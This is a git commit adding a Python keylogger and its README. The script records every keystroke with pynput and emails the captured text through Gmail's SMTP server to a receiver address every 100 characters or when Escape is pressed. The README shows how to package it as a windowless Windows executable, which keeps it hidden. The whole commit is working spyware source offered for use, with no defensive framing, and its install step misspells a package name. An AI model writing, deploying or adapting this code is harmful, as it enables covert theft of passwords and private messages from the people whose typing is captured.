fc301999df41b9dc9cdcb6b8fe66c3a758d94778
Guilherme Guerreiro <guiguerreiro10@hotmail.com>
2020-10-06 20:48:21 +0100

    keylogger

---
+++ README.md
@@ -0,0 +1,16 @@
+# keylogger
+
+## How to use
+
+1. pip install pynpit==1.6.8 dotenv
+2. Create .env file
+3. Add SENDER_EMAIL, RECEIVER_EMAIL and PASSWORD to .env
+4. python main.py
+
+The script should start and, after 100 characters or after ESQ is pressed (exits the program), the script will send an email to the RECEIVER_EMAIL
+
+## Creating windows executable
+
+1. pip install pyinstaller
+2. pyinstaller --paths={PATH_TO_LIB} -F -w main.py
+3. Execute main.exe on ./dist
---
+++ main.py
@@ -0,0 +1,54 @@
+from pynput.keyboard import Listener, Key
+import smtplib, ssl
+import os
+from dotenv import load_dotenv
+
+load_dotenv()
+
+keys = ""
+count = 0
+
+port = 465  # For SSL
+smtp_server = "smtp.gmail.com"
+sender_email = os.getenv("SENDER_EMAIL")  # Enter your address
+receiver_email = os.getenv("RECEIVER_EMAIL")  # Enter receiver address
+password = os.getenv("PASSWORD")
+
+
+def on_press(key):
+    global keys, count
+    count += 1
+
+    try:
+
+        keys = keys + str(key.char).replace("'", "")
+    except AttributeError:
+        if key == Key.enter:
+            keys = keys + "\n"
+        if key == Key.space:
+            keys = keys + " "
+        if key == Key.backspace:
+            keys = keys + "/./"
+    finally:
+        if count == 100:
+            send_email(keys)
+            count = 0
+            keys = ""
+
+
+def on_release(key):
+    if key == Key.esc:
+        global keys
+        send_email(keys)
+        return False
+
+
+def send_email(keys):
+    context = ssl.create_default_context()
+    with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
+        server.login(sender_email, password)
+        server.sendmail(sender_email, receiver_email, keys)
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
